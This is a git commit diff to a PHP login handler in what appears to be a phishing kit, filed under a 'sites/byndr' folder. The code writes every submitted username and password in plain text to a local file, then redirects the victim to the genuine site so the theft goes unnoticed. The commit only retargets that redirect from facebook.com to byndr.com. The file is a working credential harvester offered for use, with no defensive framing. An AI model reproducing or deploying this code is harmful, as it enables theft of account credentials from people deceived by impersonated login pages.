972fd4254fd5517df5f5e6c382c03352f23ba4a4
koushikavula <koushikcool987@gmail.com>
2020-01-09 09:09:42 +0530

    Update login.php

--- sites/byndr/login.php
+++ sites/byndr/login.php
@@ -1,5 +1,5 @@
 <?php
 
 file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://facebook.com/');
+header('Location: https://byndr.com/');
 exit();
